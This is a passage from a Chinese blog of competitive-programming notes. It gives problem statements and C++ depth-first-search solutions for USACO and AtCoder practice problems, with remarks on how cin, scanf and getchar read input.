class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>v</mi><mo>≤</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">1\le v \le 25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>g</mi><mo>≤</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">1\le g \le 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span></span></span></span>。<br>输入的所有整数在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">]</span></span></span></span> 范围内。</p><p>USACO 2.1</p><p>翻译来自 NOCOW</p><h2 id="题解"><a class="markdownIt-Anchor" href="#题解">#</a> 题解</h2><p>太长时间没有刷题，一些简单的深搜也不太会写了。这题不用剪枝直接暴力即可。<br>每个饲料只有 0，1 两种状态（要或者不要）<br>然后 search (t,s)<br> t 代表选中的饲料，s 代表选中饲料的个数，要么 search (t+1,s) 当前饲料不选，要么 search (t+1,s+1)<br> 选当前饲料，数据量小直接就能 AC</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span> <span class="comment">//懒人最爱的万能头文件 </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//名字空间 </span></span><br><span class="line"><span class="type">int</span> ans[<span class="number">1000</span>];<span class="comment">//这个数组是来存储解的。 </span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>];<span class="comment">//表示牛每天需要的每种维他命的最小量。 </span></span><br><span class="line"><span class="type">int</span> b[<span class="number">1000</span>][<span class="number">1000</span>];<span class="comment">//每种饲料包含的各种维他命的量的多少。</span></span><br><span class="line"><span class="type">int</span> c[<span class="number">1000</span>];<span class="comment">//每次搜索选的饲料编号 </span></span><br><span class="line"><span class="type">int</span> n,m,minn=<span class="number">100000000</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">pd</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//这是判断每次选的那些饲料中的维生素之和是不是都大于等于牛每天需要的每种维他命的最小量的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=x; j++)</span><br><span class="line">sum+=b[c[j]][i];<span class="comment">//用一个sum累加 </span></span><br><span class="line"><span class="keyword">if</span>(sum&lt;a[i]) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果有一项维生素比牛需要的维生素要少，直接返回false </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> t,<span class="type">int</span> s)</span><span class="comment">//搜索的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t&gt;m)<span class="comment">//边界</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">pd</span>(s))<span class="comment">//必须得满足条件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s&lt;minn)<span class="comment">//判断选的饲料的总数小于以前的最优解</span></span><br><span class="line">&#123;</span><br><span class="line">minn=s;<span class="comment">//替换掉</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i]=c[i];<span class="comment">//答案的数组也要被替换</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">//返回</span></span><br><span class="line">&#125;</span><br><span class="line">c[s+<span class="number">1</span>]=t;<span class="comment">//把t放在数组里</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s+<span class="number">1</span>);<span class="comment">//搜索一步</span></span><br><span class="line">c[s+<span class="number">1</span>]=<span class="number">0</span>;<span class="comment">//回溯一步</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s);<span class="comment">//如果不选第t种饲料的操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//主函数部分</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">cin&gt;&gt;a[i];<span class="comment">//读入</span></span><br><span class="line">cin&gt;&gt;m;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">cin&gt;&gt;b[i][j];<span class="comment">//还是读入</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">0</span>);<span class="comment">//调用搜索函数</span></span><br><span class="line">cout&lt;&lt;minn&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//还是输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//结束程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写这个主要是因为第一眼还是 dx，dy 类型的深搜，刚开始手足无措没有想到如何处理这种 0，1 状态的深搜使其能搜索所有的状态。</p><p>下面再贴一道纯模板题</p><hr><h1 id="深さ優先探索"><a class="markdownIt-Anchor" href="#深さ優先探索">#</a> 深さ優先探索</h1><h2 id="题面翻译"><a class="markdownIt-Anchor" href="#题面翻译">#</a> 题面翻译</h2><p>高桥先生住的小区是长方形的，被划分成一个个格子。高桥先生想从家里去鱼店，高桥先生每次可以走到他前后左右四个格子中的其中一个，但不能斜着走，也不能走出小区。</p><p>现在给出地图：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```g```：代表鱼店</span><br><span class="line"></span><br><span class="line">```.```：代表道路</span><br><span class="line"></span><br><span class="line">```#```：代表墙壁</span><br><span class="line"></span><br><span class="line">高桥先生不能穿过墙壁。</span><br><span class="line"></span><br><span class="line">输入：第一行输入n(1&lt;=n&lt;=500),m(1&lt;=m&lt;=500)代表小区的长和宽，接下来n行每行m个字符，描述小区中的每个格子。</span><br><span class="line"></span><br><span class="line">输出：如果高桥先生能到达鱼店，输出&quot;Yes&quot;，否则输出&quot;No&quot;。</span><br><span class="line"></span><br><span class="line">## 题目描述</span><br><span class="line"></span><br><span class="line">[problemUrl]: https://atcoder.jp/contests/atc001/tasks/dfs_a</span><br><span class="line"></span><br><span class="line">この問題は、講座用問題です。ページ下部に解説が掲載されています。</span><br><span class="line"></span><br><span class="line">高橋君の住む街は長方形の形をしており、格子状の区画に区切られています。 長方形の各辺は東西及び南北に並行です。 各区画は道または塀のどちらかであり、高橋君は道を東西南北に移動できますが斜めには移動できません。 また、塀の区画は通ることができません。</span><br><span class="line"></span><br><span class="line">高橋君が、塀を壊したりすることなく道を通って魚屋にたどり着けるかどうか判定してください。</span><br><span class="line"></span><br><span class="line">## 输入格式</span><br><span class="line"></span><br><span class="line">入力は以下の形式で標準入力から与えられる。</span><br><span class="line"></span><br><span class="line">&gt; $ H $ $ W $ $ c_&#123;0,0&#125; $ $ c_&#123;0,1&#125; $ $ c_&#123;0,W-1&#125; $ $ c_&#123;1,0&#125; $ $ c_&#123;1,1&#125; $ $ c_&#123;1,W-1&#125; $ : $ c_&#123;H-1,0&#125; $ $ c_&#123;H-1,1&#125; $ $ c_&#123;H-1,W-1&#125; $</span><br><span class="line"></span><br><span class="line">- $ 1 $ 行目には、街の南北の長さとして整数 $ H(1≦H≦500) $ と東西の長さとして整数 $ W(1≦W≦500) $ が空白で区切られて与えられる。</span><br><span class="line">- $ 2 $ 行目からの $ H $ 行には、格子状の街の各区画における状態 $ c_&#123;i,j&#125;(0≦i≦H-1,\ 0≦j≦W-1) $ が与えられる。 </span><br><span class="line">  - $ i $ 行目 $ j $ 文字目の文字 $ c_&#123;i,j&#125; $ はそれぞれ `s`, `g`, `.`, `#` のいずれかで与えられ、座標 $ (j,i) $ が下記のような状態であることを表す。 </span><br><span class="line">      - `s` : その区画が家であることを表す。</span><br><span class="line">      - `g` : その区画が魚屋であることを表す。</span><br><span class="line">      - `.` : その区画が道であることを表す。</span><br><span class="line">      - `#` : その区画が塀であることを表す。</span><br><span class="line">  - 高橋君は家・魚屋・道は通ることができるが、塀は通ることができない。</span><br><span class="line">  - 与えられた街の外を通ることはできない。</span><br><span class="line">  - `s` と `g` はそれぞれ 1 つずつ与えられる。</span><br><span class="line"></span><br><span class="line">## 输出格式</span><br><span class="line"></span><br><span class="line">塀を $ 1 $ 回も壊さずに、家から魚屋まで辿り着くことができる場合は `Yes`、辿りつけない場合は `No` を標準出力に $ 1 $ 行で出力せよ。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题解</span><br><span class="line"></span><br><span class="line">这道题就纯是最常见也是最简单的DFS了，多了一个字符串的转换，这里也可以复习一下getchar()函数和cin和scanf函数，</span><br><span class="line"></span><br><span class="line">&gt;**cin从第一个非空格、非回车、非tab键的位置开始读取，当与所要读取类型一致时则开始读取，遇上空格、tab键不再读取、回车结束。**</span><br><span class="line"></span><br><span class="line">&gt;输入缓冲区有数据：从输入缓冲区读取，从非空字符开始，遇到空格结束(回车、空格、tab)。尾回车会被留在输入缓冲区，并且不做处理。</span><br><span class="line">  输入缓冲区没有数据：获取键盘输入，当按下回车的时候，输入的数据连同刚按下的回车符被送入输入缓冲区。然后从输入缓冲区区读取数据，规则和上面标黄部分一样。</span><br><span class="line"></span><br><span class="line">&gt;1、scanf从非空格字符开始读取，空格字符结束(空格、TAB、回车)</span><br><span class="line">   2、当缓冲区没有数据的时候，需要先从键盘输入，然后放入缓冲区再读取。</span><br><span class="line">   3、当缓冲区有数据的时候不会从键盘获取数据。我们可以从上面输入看到第二个sacnf并没有从键盘获取数据</span><br><span class="line">   4、sacnf会把末尾回车留在缓冲区，给以后的输入埋雷</span><br><span class="line"></span><br><span class="line">接着贴上代码</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int map1[502][502];</span><br><span class="line">int record[502][502];</span><br><span class="line">#define xx x+dx[i]</span><br><span class="line">#define yy y+dy[i]</span><br><span class="line">int sx,sy,fx,fy;</span><br><span class="line">int dx[4]=&#123;0,0,1,-1&#125;;</span><br><span class="line">int dy[4]=&#123;1,-1,0,0&#125;;</span><br><span class="line">int n,m;</span><br><span class="line">int flag=0;</span><br><span class="line">void dfs(int x,int y)&#123;</span><br><span class="line">record[x][y]=1;</span><br><span class="line">if(x==fx&amp;&amp;y==fy)&#123;</span><br><span class="line">flag=1;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(!flag)</span><br><span class="line">for(int i=0;i&lt;4;i++)&#123;</span><br><span class="line">if(xx&lt;=n&amp;&amp;x&gt;0&amp;&amp;y&lt;=m&amp;&amp;y&gt;0&amp;&amp;map1[xx][yy]==0&amp;&amp;record[xx][yy]==0)&#123;</span><br><span class="line">dfs(xx,yy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">getchar();</span><br><span class="line">for(int i=1;i&lt;=n;i++)&#123;</span><br><span class="line">for(int j=1;j&lt;=m;j++)&#123;</span><br><span class="line">char tmp;</span><br><span class="line">tmp = getchar();</span><br><span class="line">if(tmp==&#x27;s&#x27;)&#123;</span><br><span class="line">sx = i,sy = j;</span><br><span class="line">map1[i][j]=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;#&#x27;)&#123;</span><br><span class="line">map1[i][j]=1;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;g&#x27;)&#123;</span><br><span class="line">fx=i,fy=j;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">map1[i][j] = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line">dfs(sx,sy);</span><br><span class="line">if(flag)&#123;</span><br><span class="line">cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">cout&lt;&lt;&quot;No&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再上一题 dfs，其实这一题和放的第一题是同一种类型，或者说是第一和第二的结合，在二维数组中每个元组有选和不选两种状态，这时候应该的做法。<br>先上题目：</p><h1 id="取数游戏"><a class="markdownIt-Anchor" href="#取数游戏">#</a> 取数游戏</h1><h2 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2">#</a> 题目描述</h2><p>一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N\times M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 的由非负整数构成的数字矩阵，你需要在其中取出若干个数字，使得取出的任意两个数字不相邻（若一个数字在另外一个数字相邻 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span> 个格子中的一个即认为这两个数字相邻），求取出数字和最大是多少。</p><h2 id="输入格式-2"><a class="markdownIt-Anchor" href="#输入格式-2">#</a> 输入格式</h2><p>第一行有一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，表示了有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 组数据。</p><p>对于每一组数据，第一行有两个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示了数字矩阵为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 列。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 个非负整数，描述了这个数字矩阵。</p><h1 id="题解-2"><a class="markdownIt-Anchor" href="#题解-2">#</a> 题解</h1><p>这里不给出样例输入输出了<br>因为数据量小，直接暴力深搜。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="type">int</span> N,M;</span><br><span class="line"><span class="type">int</span> map[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line"><span class="type">int</span> maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> enable[<span class="number">8</span>][<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">8</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">8</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> currentsum = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xx x+dx[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> yy y+dy[i]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y == M+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">search</span>(x+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x == N+<span class="number">1</span>)&#123;</span><br><span class="line">maxsum = <span class="built_in">max</span>(maxsum,currentsum);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(enable[x][y]==<span class="number">0</span>)&#123;</span><br><span class="line">currentsum += map[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]--;</span><br><span class="line">&#125;</span><br><span class="line">currentsum-=map[x][y]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;T;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=T;i++)&#123;</span><br><span class="line"><span class="comment">//memset(enable,0,sizeof(enable));</span></span><br><span class="line"><span class="comment">//memset(map,0,sizeof(map));//在做每个数据前都要初始化数组 </span></span><br><span class="line">cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line">maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=M;k++)&#123;</span><br><span class="line">cin&gt;&gt;map[j][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">currentsum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">cout&lt;&lt;maxsum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>这里我第一次写代码时，并没有考虑到所有的情况，向上面这样写才能考虑到所有的情况，因为你需要考虑到每个元组选或不选，要在 search 中体现出来。而我第一次写代码时默认都选择，进行了 n*m 的循环寻找，自然会少一些情况。这算是本题的一点收获。</p><h2 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3">#</a> 题目描述</h2><p>给出一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 条边的无向无权图，顶点编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1\sim N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。问从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 开始，到其他每个点的最短路有几条。</p><h2 id="输入格式-3"><a class="markdownIt-Anchor" href="#输入格式-3">#</a> 输入格式</h2><p>第一行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo separator="true">,</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N,M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，为图的顶点数与边数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，表示有一条由顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> 连向顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 